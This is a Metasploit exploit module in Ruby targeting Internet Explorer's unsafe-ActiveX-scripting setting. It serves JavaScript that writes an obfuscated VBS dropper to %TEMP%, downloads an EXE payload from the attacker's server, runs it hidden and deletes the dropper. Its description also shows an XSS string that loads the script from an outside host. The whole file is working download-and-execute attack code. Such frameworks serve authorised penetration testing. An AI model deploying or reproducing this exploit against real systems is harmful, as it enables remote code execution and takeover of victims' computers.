##

#

##



##

# This file is part of the Metasploit Framework and may be subject to 

# redistribution and commercial restrictions. Please see the Metasploit

# Framework web site for more information on licensing and terms of use.

# http://metasploit.com/projects/Framework/

##





require 'msf/core'





class Metasploit3 < Msf::Exploit::Remote



	include Msf::Exploit::Seh

	include Msf::Exploit::Remote::HttpServer::HTML



	def initialize(info = {})

		super(update_info(info,

			'Name'           => 'Internet Explorer Unsafe Scripting Misconfiguration Vulnerability',

			'Description'    => %q{

				This exploit takes advantage of the "Initialize and script ActiveX controls not

			marked safe for scripting" setting within Internet Explorer.  When this option is set,

			IE allows access to the WScript.Shell ActiveX control, which allows javascript to

			interact with the file system and run commands.  This security flaw is not uncommon 

			in corporate environments for the 'Intranet' or 'Trusted Site' zones.  This option 

			does not allow javascript to save binary data to the file system without a security 

			alert, however, so this module downloads the binary executable through a .vbs script 

			written to disk before executing.

			

				When set via domain policy, the most common registry entry to modify is HKLM\

			Software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201,

			which if set to '0' forces ActiveX controls not marked safe for scripting to be enabled

			for the Intranet zone.

			

				This module creates javascript code meant to be included in a <SCRIPT> tag, such as

			http://intranet-server/xss.asp?id="><script%20src=http://10.10.10.10/ie_unsafe_script.js>

			</script>.

			},

			'License'        => MSF_LICENSE,

			'Author'         => 

				[ 

					'natron'

				],

			'Version'        => '',

			'References'     => 

				[

					[ 'MS', 'http://support.microsoft.com/kb/182569' ],

				],

			'Payload'        =>

				{

					'Space'           => 4000,

					'StackAdjustment' => -3500,

				},

			'Platform'       => 'win',

			'Targets'        =>

				[

	  				[ 'Automatic', { } ],



				],

			'DefaultTarget'  => 0))

	end

	

	def on_request_uri(cli, request)



		if (request.uri.match(/payload/))

			return if ((p = regenerate_payload(cli)) == nil)

			data = Rex::Text.to_win32pe(p.encoded, '')

			print_status("Sending EXE payload to #{cli.peerhost}:#{cli.peerport}...")

			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })

			return

		end

		

		# Build out the HTML response page

		var_shellobj		= rand_text_alpha(rand(10)+5);

		var_fsobj			= rand_text_alpha(rand(10)+5);

		var_fsobj_file		= rand_text_alpha(rand(10)+5);

		var_vbsname			= rand_text_alpha(rand(10)+5);

		var_writedir		= rand_text_alpha(rand(10)+5);

		var_xmlhttp			= rand_text_alpha(rand(10)+5);

		var_exename			= rand_text_alpha(rand(10)+5);

		var_binary_stream	= rand_text_alpha(rand(10)+5);

		var_oResp			= rand_text_alpha(rand(10)+5);

		var_const1			= rand_text_alpha(rand(10)+5);

		var_const2			= rand_text_alpha(rand(10)+5);

		var_const3			= rand_text_alpha(rand(10)+5);

		

		# Build the content that will end up in the .vbs file

		vbs_content	= Rex::Text.to_hex(%Q|

Set #{var_xmlhttp} = CreateObject("M" & "SXM" & "L2.XM" & "LHT" & "TP")

#{var_xmlhttp}.Open "GET", "http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{datastore['URIPATH']}/payload", False

#{var_xmlhttp}.Send ()



If #{var_xmlhttp}.Status = 200 Then

  #{var_oResp} = #{var_xmlhttp}.responseBody

  #{var_exename} = WScript.CreateObject("WSc" & "r" & "ip" & "t.Sh" & "el" & "l").ExpandEnvironmentStrings("%T" & "EM" & "P%") & "\\#{var_exename}.exe"

  Set #{var_binary_stream} = CreateObject("A" & "D" & "OD" & "B.St" & "rea" & "m")

  #{var_const1} = 1

  #{var_const2} = 2

  #{var_const3} = 3

  #{var_binary_stream}.Type = #{var_const1}

  #{var_binary_stream}.Mode = #{var_const3}

  #{var_binary_stream}.Open

  #{var_binary_stream}.Write #{var_oResp}

  #{var_binary_stream}.SaveToFile #{var_exename}, #{var_const2}

  Set #{var_oResp} = Nothing

End If

  

Set #{var_xmlhttp} = Nothing

|)



		# Build the javascript that will be served

		js_content 	= %Q|

var #{var_shellobj} = new ActiveXObject("WScript.Shell");

var #{var_fsobj}    = new ActiveXObject("Scripting.FileSystemObject");

var #{var_writedir} = #{var_shellobj}.ExpandEnvironmentStrings("%TEMP%");

var #{var_fsobj_file} = #{var_fsobj}.OpenTextFile(#{var_writedir} + "\\\\" + "#{var_vbsname}.vbs",2,true);



#{var_fsobj_file}.Write(unescape("#{vbs_content}"));

#{var_fsobj_file}.Close();



#{var_shellobj}.run("wscript.exe " + #{var_writedir} + "\\\\" + "#{var_vbsname}.vbs", 1, true);

#{var_shellobj}.run(#{var_writedir} + "\\\\" + "#{var_exename}.exe", 0, false);

#{var_fsobj}.DeleteFile(#{var_writedir} + "\\\\" + "#{var_vbsname}.vbs");

|



		print_status("Sending exploit javascript to #{cli.peerhost}:#{cli.peerport}...")

		print_status("Exe will be #{var_exename}.exe and must be manually removed from the %TEMP% directory on the target.");

		

		# Transmit the response to the client

		send_response(cli, js_content, { 'Content-Type' => 'text/javascript' })

		

		# Handle the payload

		handler(cli)		

	end

end
